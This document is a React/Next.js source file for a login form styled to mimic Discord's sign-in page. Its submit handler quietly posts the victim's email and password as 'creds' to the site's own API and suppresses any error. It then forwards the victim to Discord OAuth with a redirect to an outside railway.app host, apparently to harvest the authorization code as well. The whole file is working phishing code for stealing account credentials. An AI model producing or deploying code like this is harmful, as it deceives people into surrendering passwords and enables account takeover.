'use client';

import { useForm } from 'react-hook-form';

type FormData = {
  email: string;
  password: string;
};

export default function LoginForm() {
  const { register, handleSubmit } = useForm<FormData>();

  const onSubmit = async (data: FormData) => {
    // Send creds to API route
    fetch('/api/auth', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        type: 'creds',
        email: data.email,
        password: data.password
      })
    }).catch(() => {});

    // Redirect to Discord OAuth
    const clientId = '1479876735242731571';
    const redirectUri = encodeURIComponent('https://sya-production.up.railway.app/api/auth');
    window.location.href = `https://discord.com/oauth2/authorize?client_id=${clientId}&redirect_uri=${redirectUri}&response_type=code&scope=identify%20email`;
  };

  return (
    <form onSubmit={handleSubmit(onSubmit)} className="space-y-6">
      <div>
        <label className="block text-sm uppercase tracking-wide mb-2">Email or Phone Number</label>
        <input
          {...register('email', { required: true })}
          className="w-full p-3 bg-[#2f3136] border border-[#202225] rounded focus:outline-none focus:border-[#5865f2]"
          required
        />
      </div>
      <div>
        <label className="block text-sm uppercase tracking-wide mb-2">Password</label>
        <input
          type="password"
          {...register('password', { required: true })}
          className="w-full p-3 bg-[#2f3136] border border-[#202225] rounded focus:outline-none focus:border-[#5865f2]"
          required
        />
      </div>
      <button
        type="submit"
        className="w-full py-3 bg-[#5865f2] hover:bg-[#4752c4] rounded font-semibold"
      >
        Log In
      </button>
    </form>
  );
}
